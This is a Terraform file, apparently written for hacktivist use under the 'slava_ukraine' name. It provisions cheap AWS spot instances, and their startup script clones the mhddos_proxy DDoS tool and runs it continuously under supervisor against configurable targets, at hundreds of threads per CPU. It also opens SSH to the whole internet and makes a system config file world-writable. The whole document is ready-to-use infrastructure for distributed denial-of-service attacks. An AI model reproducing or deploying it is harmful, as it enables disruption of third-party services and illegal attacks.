terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 3.27"
    }
  }

  required_version = ">= 0.14.9"
}

provider "aws" {
  profile = "default"
  region  = var.region
}

resource "aws_security_group" "slava_ukraine_sg" {
  name        = "allow_ssh"
  description = "Allow SSH inbound traffic"


  ingress {
    description      = "TLS from VPC"
    from_port        = 22
    to_port          = 22
    protocol         = "tcp"
    cidr_blocks      = ["0.0.0.0/0"]
    ipv6_cidr_blocks = ["::/0"]
  }

  egress {
    from_port        = 0
    to_port          = 0
    protocol         = "-1"
    cidr_blocks      = ["0.0.0.0/0"]
    ipv6_cidr_blocks = ["::/0"]
  }

  tags = {
    Name = "allow_ssh"
  }
}

resource "aws_spot_instance_request" "slava_ukraine" {
  count                          = 2
  ami                            = var.ami
  spot_type                      = "persistent"
  spot_price                     = "0.0019"
  instance_type                  = "t3.nano"
  instance_interruption_behavior = "terminate"
  vpc_security_group_ids         = [aws_security_group.slava_ukraine_sg.id]
  key_name                       = var.ssh_key

  root_block_device {
    volume_size = 8
  }

  user_data = <<EOF
#!/bin/bash

mkdir -p `pwd`/${var.workdir}
cd ${var.workdir}
sudo apt update && sudo apt install -y git screen python3 python3-pip supervisor
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
pip3 install -r mhddos_proxy/requirements.txt
sudo touch /etc/supervisor/conf.d/ddos.conf
sudo chmod 777 /etc/supervisor/conf.d/ddos.conf
echo -e "[program:piZddos]\ncommand=/usr/bin/python3 `pwd`/mhddos_proxy/runner.py -t $((`nproc` *300))  ${var.targets}\nautostart=true\nautorestart=true\nstdout_logfile=/var/log/piZddos.out.log" > /etc/supervisor/conf.d/ddos.conf
sudo supervisorctl reread
sudo supervisorctl update
EOF

  tags = {
    Name = "slava_ukraine"
  }
}
